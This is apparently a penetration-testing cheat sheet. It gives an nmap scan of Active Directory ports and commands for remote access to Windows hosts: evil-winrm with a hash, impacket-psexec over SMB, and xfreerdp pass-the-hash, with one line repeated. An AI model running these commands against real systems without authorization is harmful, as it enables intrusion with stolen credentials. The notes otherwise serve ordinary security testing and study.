#### Port Scanning

```
#Good for active directory machines.
nmap -Pn -iL <hosts> -p22,3389,5895,47001,88,389,445,80,443,21,8000,8080 -oA internal_scan
```


```
#EVIL-WINRM
evil-winrm -u <user> -H <hash> -i <ip>

#SMB
impacket-psexec <domain>/<user>@<target-ip> -dc-ip <ip>
impacket-psexec <domain>/<user>@<target-ip>

#RDP
xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>
xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>

```